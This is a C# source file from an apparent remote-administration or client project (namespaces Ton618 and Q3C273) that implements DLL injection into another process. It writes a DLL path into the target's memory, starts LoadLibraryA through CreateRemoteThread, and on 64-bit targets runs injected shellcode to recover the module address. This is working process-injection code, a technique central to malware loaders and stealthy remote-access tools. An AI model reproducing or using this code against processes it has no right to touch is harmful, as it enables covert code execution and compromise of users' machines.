using Q3C273.Shared;
using System;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using static Ton618.Utilities.ClientNatives;

namespace Ton618.Utilities.PE
{
    public partial class PEImage
    {
        private unsafe IntPtr ImportDllInRemoteProcess(IntPtr processHandle, IntPtr importDllPathPtr)
        {
            var written = UIntPtr.Zero;
            var ptrSize = Marshal.SizeOf<IntPtr>();

            var remoteDllPathMemory = processHandle.WriteStringToProcess(importDllPathPtr, out var dllPathSize);
            var loadLibraryProcAddress = LookupPointer("kernel32.dll", "LoadLibraryA");

            bool state;
            IntPtr dllAddress;
            if (Is64Bitness)
            {
                //For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
                //Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
                var returnValueMemory = VirtualAllocEx(processHandle, IntPtr.Zero, (UIntPtr)dllPathSize, AllocationType.COMMIT | AllocationType.RESERVE, PageAccessRights.PAGE_READWRITE);
                if (returnValueMemory == IntPtr.Zero)
                    throw new NativeMemoryException("LoadLibraryA return value memory");

                ShellCode.LoadLibraryA_x64.ExecuteOn(processHandle, remoteDllPathMemory, loadLibraryProcAddress, returnValueMemory);

                var retValMem = Marshal.AllocHGlobal(ptrSize);
                state = ReadProcessMemory(processHandle, returnValueMemory, retValMem, (UIntPtr)ptrSize, ref written);
                if (!state)
                    throw new NativeMemoryException("LoadLibraryA return value memory", returnValueMemory);

                dllAddress = Marshal.PtrToStructure<IntPtr>(retValMem);
                VirtualFreeEx(processHandle, returnValueMemory, UIntPtr.Zero, MemFreeType.MEM_RELEASE);
            }
            else
            {
                var threadHandle = processHandle.CreateRemoteThreadAuto(loadLibraryProcAddress, remoteDllPathMemory);
                if (WaitForSingleObject(threadHandle, 30000) != 0)
                    throw new AggregateException("Library loader thread didn't finished successfully. (or timeout)");

                state = GetExitCodeThread(threadHandle, out var exitCode);
                if (!state || exitCode == 0)
                    throw new AggregateException("Failed to read library loader thread exit code.");

                dllAddress = (IntPtr)exitCode;
            }

            VirtualFreeEx(processHandle, remoteDllPathMemory, UIntPtr.Zero, MemFreeType.MEM_RELEASE);
            return dllAddress;
        }
    }
}
